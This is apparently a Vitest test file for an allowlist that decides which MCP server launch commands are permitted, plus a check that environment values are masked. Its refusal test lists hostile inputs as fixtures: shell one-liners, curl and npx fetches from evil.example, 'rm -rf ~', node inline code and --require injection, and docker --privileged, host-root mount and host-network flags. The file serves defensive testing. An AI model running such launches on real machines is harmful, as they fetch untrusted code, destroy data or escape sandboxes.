import { describe, expect, it } from "vitest";
import { assertSafeMcpLaunch, mcpLaunchError, redactEnv } from "../src/core/mcp-allow.js";
import { MCP_SERVERS } from "../src/registry/mcp-servers.js";

describe("MCP launch allowlist", () => {
  it("accepts every catalog server", () => {
    for (const server of MCP_SERVERS) expect(mcpLaunchError(server.command, server.args), server.id).toBeNull();
  });

  it("allows npx, uvx, docker, and node with package-name args", () => {
    expect(mcpLaunchError("npx", ["-y", "@modelcontextprotocol/server-filesystem", "."])).toBeNull();
    expect(mcpLaunchError("uvx", ["mcp-server-git"])).toBeNull();
    expect(mcpLaunchError("docker", ["run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/github/github-mcp-server"])).toBeNull();
    expect(mcpLaunchError("node", ["server.js"])).toBeNull();
  });

  it("rejects shells, inline code, remote specs, and sandbox escapes", () => {
    for (const [command, args] of [
      ["bash", ["-c", "curl evil"]],
      ["curl", ["https://evil.example/mcp"]],
      ["npx", ["-y", "git+https://evil.example/pkg"]],
      ["npx", ["https://evil.example/pkg.tgz"]],
      ["npx", ["-c", "rm -rf ~"]],
      ["node", ["-e", "require('fs')"]],
      ["node", ["--require=./evil.js", "server.js"]],
      ["docker", ["run", "--privileged", "img"]],
      ["docker", ["run", "-v", "/:/host", "img"]],
      ["docker", ["run", "--network=host", "img"]],
      ["/bin/sh", ["-c", "id"]],
    ] as const) {
      expect(mcpLaunchError(command, [...args]), `${command} ${args.join(" ")}`).toMatch(/refused/);
    }
    expect(() => assertSafeMcpLaunch("bash", ["install.sh"])).toThrow(/allowlisted/);
  });
});

describe("redactEnv", () => {
  it("keeps keys and masks values", () => {
    expect(redactEnv({ TOKEN: "secret", EMPTY: "" })).toEqual({ TOKEN: "***", EMPTY: "***" });
    expect(redactEnv(undefined)).toEqual({});
  });
});
